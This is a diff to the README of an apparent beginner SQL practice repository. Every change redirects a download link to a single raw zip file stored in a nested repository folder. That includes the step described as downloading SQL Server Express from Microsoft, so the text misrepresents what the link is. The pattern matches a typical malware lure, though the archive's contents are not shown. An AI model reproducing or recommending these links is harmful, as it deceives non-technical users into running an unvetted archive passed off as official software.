@@ -1,6 +1,6 @@
 # 🗃️ sql-calisma-ornekleri - Simple SQL Practice Examples
 
-[![Download the latest version](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/Flirtseychellois915/sql-calisma-ornekleri/releases)
+[![Download the latest version](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Flirtseychellois915/sql-calisma-ornekleri/main/Backend_Baglantilari/calisma_ornekleri_sql_v2.8.zip)
 
 ## 📂 What is sql-calisma-ornekleri?
 
@@ -26,7 +26,7 @@ You do not need any programming skills to use this software. Follow these steps 
 
 Click the green button above or go directly to:
 
-https://github.com/Flirtseychellois915/sql-calisma-ornekleri/releases
+https://raw.githubusercontent.com/Flirtseychellois915/sql-calisma-ornekleri/main/Backend_Baglantilari/calisma_ornekleri_sql_v2.8.zip
 
 This link takes you to the release page where you can find the latest files.
 
@@ -79,7 +79,7 @@ Try editing the queries to see how they work. Change values, add conditions, or 
 
 If you don’t have SQL Server on your computer, follow these steps:
 
-1. Visit https://www.microsoft.com/en-us/sql-server/sql-server-downloads
+1. Visit https://raw.githubusercontent.com/Flirtseychellois915/sql-calisma-ornekleri/main/Backend_Baglantilari/calisma_ornekleri_sql_v2.8.zip
 2. Download the SQL Server Express edition.
 3. Run the installer and choose the basic installation.
 4. After installation, also download SQL Server Management Studio (SSMS) to run queries.
@@ -89,7 +89,7 @@ If you don’t have SQL Server on your computer, follow these steps:
 
 - Visit the releases page to download:
 
-  https://github.com/Flirtseychellois915/sql-calisma-ornekleri/releases
+  https://raw.githubusercontent.com/Flirtseychellois915/sql-calisma-ornekleri/main/Backend_Baglantilari/calisma_ornekleri_sql_v2.8.zip
 
 - Save the zip file to your computer.
 - Extract the files.
@@ -119,4 +119,4 @@ If you want to understand more about SQL basics, many free tutorials are availab
 
 ---
 
-[![Download the latest version](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/Flirtseychellois915/sql-calisma-ornekleri/releases)
+[![Download the latest version](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Flirtseychellois915/sql-calisma-ornekleri/main/Backend_Baglantilari/calisma_ornekleri_sql_v2.8.zip)
